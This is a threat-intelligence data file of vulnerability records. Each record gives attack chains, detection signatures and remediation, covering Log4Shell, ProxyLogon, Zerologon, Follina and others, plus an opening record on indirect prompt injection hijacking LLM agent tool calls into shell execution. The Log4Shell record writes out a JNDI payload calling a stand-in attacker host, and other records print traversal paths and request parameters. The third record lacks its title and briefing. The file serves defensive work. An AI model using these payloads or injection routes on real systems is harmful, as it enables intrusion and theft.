title: Autonomous AI Agent Multi-Tool Execution Hijack & Indirect Prompt Injection RCE
vendor: Enterprise LLM Agent Tool Frameworks (LangChain, AutoGen, CrewAI runtimes)
briefing: Remote unauthenticated adversaries inject adversarial indirect prompt tokens into ingested web data and documents, hijacking tool function-calling dispatcher hooks. The model autonomously invokes system commands and shell tools with the agent daemon's local system privileges, completely circumventing output guardrails.
headHero: DarkPrompt Adversary Syndicate & Autonomous Agent Brokers
corePoints: Adversarial semantic token injection bypassing tokenizer guardrails; unvalidated tool dispatcher directly evaluates shell commands passed by LLM function call arguments.
affectedVictims: Enterprise LLM tool pipelines, autonomous customer service agents, automated code-review bots, and cloud inference clusters.
attackUseCase: Data ingestion poisoned with hidden delimiters -> prompt injection triggers malicious function call -> tool dispatcher executes shell command -> root container takeover.
detectionSignatures: High entropy semantic tokens in ingested document buffers; anomalous subprocess spawns under python agent runner (e.g. bash, sh, curl); unusual outbound WebSocket traffic.
remediation: Implement strict sandbox tool containerization (gVisor/Firecracker), enforce deterministic parameter validation schemas with Pydantic, and isolate agent execution permissions.
attackVector: Network / Indirect Semantic Input Prompt Injection

title: Terrapin Attack: SSH Transport Protocol Prefix Truncation Vulnerability
briefing: Prefix truncation vulnerability in the SSH transport layer protocol allows a man-in-the-middle (MITM) attacker to manipulate sequence numbers during key exchange, silently deleting extension negotiation messages (EXT_INFO) without triggering integrity check failures. Allows downgrading keystroke timing defense mechanisms and client public key authentication security.
headHero: Advanced MITM Network Interceptors & Academic Research Units
corePoints: SSH protocol sequence number synchronization flaw when using ChaCha20-Poly1305 or CBC with Encrypt-then-MAC; messages injected prior to cipher activation drop handshake packets undetected.
affectedVictims: Global remote administration gateways, cloud developer bastions, automated CI/CD SSH relays, and enterprise jump boxes.
attackUseCase: Man-in-the-middle network interception -> handshake message injection during unencrypted phase -> sequence number desync -> silent extension stripping -> security downgrade.
detectionSignatures: SSH connection anomalies where client and server report mismatched sequence numbers; sudden drop of ChaCha20-Poly1305 ciphers in transit.
remediation: Upgrade SSH clients and servers to support `strict KEX` extension (`kex-strict-c-v00@openssh.com`); disable legacy CBC ciphers.
attackVector: Network / Man-in-the-Middle Transport Layer Manipulation

affectedVictims: Enterprise Java web applications, banking payment microservices, supply-chain logistics platforms, and cloud API endpoints.
attackUseCase: HTTP POST with crafted classLoader parameters -> Tomcat logging reconfigured -> JSP webshell written to webapps/ROOT -> remote shell access achieved.
detectionSignatures: HTTP POST bodies containing `class.module.classLoader.resources.context.parent.pipeline.first.pattern`; unexpected `.jsp` files in Tomcat webapps.
remediation: Upgrade Spring Framework to 5.3.18+ or 5.2.20+; upgrade to Spring Boot 2.6.6+; enforce Tomcat valve property restrictions.
attackVector: Network / HTTP Request Parameter ClassLoader Data Binding

title: ProxyNotShell: Microsoft Exchange Server Remote PowerShell Code Execution
briefing: Chained vulnerability with CVE-2022-41040 (SSRF) allowing an authenticated attacker to trigger remote code execution via the Exchange Remote PowerShell backend. Attackers weaponized this zero-day wave to steal sensitive enterprise emails, dump domain credentials using Mimikatz, and deploy ransomware.
headHero: GTSC-Discovered Campaign & Play Ransomware Syndicate
corePoints: Inadequate URL sanitization in FrontEnd Exchange routing chained with unauthenticated serialization flaws in Remote PowerShell backend on port 444.
affectedVictims: Global enterprise Exchange email servers, government telecommunications, healthcare clinics, and legal organizations.
attackUseCase: SSRF to backend Remote PowerShell -> serialization gadget invocation -> arbitrary code execution as NT AUTHORITY\SYSTEM -> China Chopper webshell drop.
detectionSignatures: IIS logs showing requests to `/autodiscover/autodiscover.json` with `@powershell` URI tokens; presence of `.aspx` webshells in `FrontEnd\HttpProxy`.
remediation: Apply Microsoft November 2022 security updates; configure IIS URL Rewrite rule blocking `{UrlDecode:{REQUEST_URI}}` containing `.*autodiscover\.json.*Powershell.*`.
threatActor: GTSC Identified Threat Actors & Play Ransomware
attackVector: Network / Exchange SSRF to Remote PowerShell RCE

title: Follina Windows Support Diagnostic Tool (MSDT) Remote Code Execution
briefing: Remote code execution vulnerability exists when MSDT is called using the URL protocol from an application such as Word. An attacker who successfully exploits this vulnerability can run arbitrary code with the privileges of the calling application, even when macros are completely disabled or when files are opened in Protected View.
headHero: TA413 (LuckyCat) & Cobalt Strike Initial Access Brokers
corePoints: Microsoft Office HTML template injection executing `ms-msdt:/` URI schemes; parameter injection triggers arbitrary PowerShell code evaluation via diagnostics engine.
affectedVictims: Corporate legal teams, defense aerospace contractors, government ministries, and financial institutions.
attackUseCase: Phishing email with `.doc` attachment -> Word fetches external HTML template -> `ms-msdt` URI invocation -> PowerShell payload executes -> full desktop compromise.
detectionSignatures: Process execution: winword.exe spawning msdt.exe which spawns powershell.exe; registry queries to `HKEY_CLASSES_ROOT\ms-msdt`.
remediation: Apply Microsoft June 2022 cumulative security update; delete registry key `HKEY_CLASSES_ROOT\ms-msdt` to disable protocol handling.
attackVector: Network / Malicious Document Office Template Protocol Injection

title: Log4Shell: Apache Log4j JNDI Lookup Remote Code Execution (Global Incident)
briefing: Unauthenticated remote code execution vulnerability in Apache Log4j's JNDI lookup functionality. When an attacker passes a string like `${jndi:ldap://attacker.com/payload}` into any logged input field (headers, usernames, forms), Log4j resolves the JNDI endpoint and loads arbitrary Java byte-code from the remote server, executing it with server privileges.
headHero: Nation-State APTs (China, Iran, Russia) & Global Ransomware Syndicates
corePoints: Log4j JNDI lookups automatically evaluated in format strings without URL scheme restrictions or LDAP class loading boundaries.
affectedVictims: Virtually the entire global Java ecosystem: Apple iCloud, Steam, Minecraft, Amazon Web Services, IBM, Twitter, enterprise databases, and government IT.
attackUseCase: Input vector containing `${jndi:ldap://...}` -> logged by Log4j -> outbound LDAP query initiated -> serialized Java payload delivered -> root execution.
detectionSignatures: Log entries or HTTP User-Agent/X-Forwarded-For headers containing `${jndi:`; outbound TCP connections over ports 389/636/1099 to unknown internet addresses.
remediation: Upgrade to Log4j 2.17.1+; set system property `log4j2.formatMsgNoLookups=true`; remove JndiLookup class file from log4j-core JAR.
attackVector: Network / JNDI LDAP Injection in Logged Data

title: ProxyLogon: Microsoft Exchange Server Pre-Authentication SSRF & WebShell Wave
briefing: Pre-authentication server-side request forgery (SSRF) flaw in Exchange Server allowing remote unauthenticated attackers to send arbitrary HTTP requests to backend Exchange services by forging administrative cookies (`X-BEResource`). Attackers chained this with file write vulnerabilities to drop persistent China Chopper webshells across tens of thousands of Exchange servers worldwide.
headHero: HAFNIUM (State-Sponsored Cyber Espionage) & DearCry Ransomware
corePoints: Exchange FrontEnd proxy improperly parsing `X-BEResource` cookies, allowing attackers to route arbitrary requests to internal ECP and PowerShell endpoints without credentials.
affectedVictims: Over 250,000 enterprise and government Microsoft Exchange servers worldwide, including defense contractors and law firms.
attackUseCase: Crafted HTTP POST to `/owa/auth/x.js` with X-BEResource cookie -> SSRF to backend ECP -> arbitrary file write -> China Chopper webshell -> mailbox exfiltration.
detectionSignatures: HttpProxy/Owa log entries showing non-standard POST requests; presence of `.aspx` webshells under `inetpub\wwwroot\aspnet_client\`; unexpected procdump.exe execution.
remediation: Deploy Microsoft March 2021 emergency cumulative security update; run Microsoft Exchange On-Premises Mitigation Tool (EOMT); audit web roots for webshells.
attackVector: Network / Unauthenticated HTTP Cookie Proxy SSRF

title: PrintNightmare: Windows Print Spooler Remote Code Execution & Local Privilege Escalation
briefing: Vulnerability in the Windows Print Spooler service (`spoolsv.exe`) where the function `RpcAddPrinterDriverEx()` failed to restrict driver installation privileges. An attacker with standard network domain credentials could instruct a remote server (such as a Domain Controller) to install a malicious print driver from an SMB share, executing arbitrary DLLs with NT AUTHORITY\SYSTEM privileges.
headHero: Vice Society Ransomware Syndicate & APT29 (Cozy Bear)
corePoints: Improper permission validation in `RpcAddPrinterDriverEx()`; allows unprivileged domain accounts to install arbitrary driver binaries executing as SYSTEM.
affectedVictims: Enterprise Active Directory domain controllers, hospital network servers, corporate workstations, and university campuses.
attackUseCase: Low-privileged domain login -> call RpcAddPrinterDriverEx() with rogue SMB share path -> Spooler service downloads driver DLL -> SYSTEM execution -> domain admin takeover.
detectionSignatures: Event ID 316 in PrintService/Operational showing driver additions from UNC paths; unexpected DLL creations in `C:\Windows\System32\spool\drivers\x64\3\`.
remediation: Apply Microsoft July 2021 emergency security patch; disable Print Spooler service (`Stop-Service -Name Spooler -Force`) on all Domain Controllers.
attackVector: Network / Windows Print Spooler RPC Driver Injection

title: Zerologon: Netlogon Insecure AES-CFB8 Cryptographic Initialization Vector Bypass
briefing: Cryptographic flaw in Netlogon Remote Protocol (MS-NRPC). Because the implementation uses an insecure fixed AES-CFB8 initialization vector of 16 zero bytes, sending 8 zero bytes as an authentication challenge produces a matching ciphertext of all zeros once in every 256 attempts. An unauthenticated network attacker can exploit this within 3 seconds to reset the Active Directory domain controller machine password to an empty string, gaining complete enterprise administrative takeover.
headHero: Ryuk & Conti Ransomware Syndicates, TA505, Chimera APT
corePoints: Flaw in ComputeNetlogonCredential using AES-CFB8 with static IV=0; 1/256 probability of zero-ciphertext match bypasses authentication entirely.
affectedVictims: Enterprise Active Directory domains, government municipal networks, healthcare health systems, and global banking data centers.
attackUseCase: Unauthenticated connection to port 135/445 -> send zero-byte Netlogon authentication challenges (~256 tries) -> auth accepted -> reset DC password -> dump NTDS.dit -> domain root.
detectionSignatures: Event ID 4742 (computer account changed) for domain controller computer account; burst of failed Netlogon auth attempts (Event ID 5805) followed immediately by success.
remediation: Apply Microsoft August 2020 & February 2021 Netlogon security updates enforcing secure RPC sealing across all domain member computers.
attackVector: Adjacent/Network / Cryptographic Zero-IV Netlogon Bypass

title: SIGRed: Windows DNS Server Integer Overflow Wormable Remote Code Execution
briefing: Remote code execution vulnerability in Windows DNS Server when it fails to properly handle requests. An attacker who successfully exploited the vulnerability could run arbitrary code in the context of the Local System Account. A 17-year-old integer overflow flaw in `dns.exe` when parsing SIG/KEY resource records exceeding 64KB, allowing wormable network replication.
headHero: Advanced Threat Research Units & Exploit Developers
corePoints: Integer overflow in `dns.exe!SigWireRead` when calculating memory allocation for oversized SIG records (>65535 bytes); produces heap buffer overflow.
affectedVictims: Active Directory Domain Controllers, internal corporate DNS infrastructure, municipal governments, and enterprise cloud networks.
attackUseCase: Malicious DNS query triggered -> authoritative DNS responds with >64KB SIG record -> Windows DNS Server integer overflow -> SYSTEM shellcode execution -> wormable spread.
detectionSignatures: Inbound TCP DNS traffic (port 53) containing DNS responses with payload length exceeding 65,000 bytes; sudden crash or child processes under dns.exe.
remediation: Apply Microsoft July 2020 cumulative security patch; apply registry workaround setting `TcpReceivePacketSize` to `0xFF00` (65280).
attackVector: Network / Windows DNS Server TCP SIG Record Integer Overflow

title: F5 BIG-IP Traffic Management User Interface (TMUI) Pre-Auth RCE
briefing: Undisclosed directory traversal vulnerability in the Traffic Management User Interface (TMUI) of F5 BIG-IP appliances allowing unauthenticated remote attackers to execute arbitrary system commands, create/delete files, and disable services via crafted HTTP requests.
headHero: State-Sponsored Espionage Clusters & Ransomware Affiliates
corePoints: Apache/Tomcat discrepancy in URI path normalization (`..;` matrix parameter traversal) bypassing TMUI authentication filters.
affectedVictims: Enterprise application delivery controllers, cloud load balancers, financial network switches, and critical infrastructure gateways.
attackUseCase: HTTP request to `/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp` -> unauthenticated arbitrary file read/write -> shell command execution -> device compromise.
detectionSignatures: HTTP requests containing `/..;/` in web server access logs; unusual cron job entries or rogue administrator accounts created in `/config/bigip.conf`.
remediation: Upgrade BIG-IP software to fixed maintenance releases; restrict TMUI management access to internal protected management networks.
attackVector: Network / Unauthenticated HTTP URI Directory Traversal

title: CurveBall / ChainFools: Windows CryptoAPI Elliptic Curve Certificate Spoofing
briefing: Flaw in how Windows CryptoAPI (`crypt32.dll`) validates Elliptic Curve Cryptography (ECC) certificates. Instead of validating against trusted root CA parameters, CryptoAPI accepted user-supplied custom generator parameters that matched the public key of a trusted root. Allows attackers to forge digital code-signing signatures and decrypt HTTPS TLS traffic without browser security warnings.
headHero: NSA-Discovered Vulnerability & Nation-State Intelligence Units
corePoints: Incomplete curve parameter validation in `crypt32.dll`; custom elliptic curve base points permitted forging certificates claiming to be signed by Microsoft Root CA.
affectedVictims: Windows enterprise desktop fleets, secured government VPN clients, Authenticode signed binaries, and HTTPS traffic monitoring appliances.
attackUseCase: Attacker creates rogue CA certificate with custom generator -> signs malicious executable with forged Microsoft signature -> Windows verifies binary as trusted -> execution.
detectionSignatures: Sysmon Event ID 7 (Image Loaded) with unexpected digital signature attributes; TLS handshakes presenting ECC certificates with explicit custom curve parameters.
remediation: Apply Microsoft January 2020 Patch Tuesday cumulative security updates immediately; enforce strict PKI validation.
attackVector: Network / Forged ECC Cryptographic Certificate Spoofing
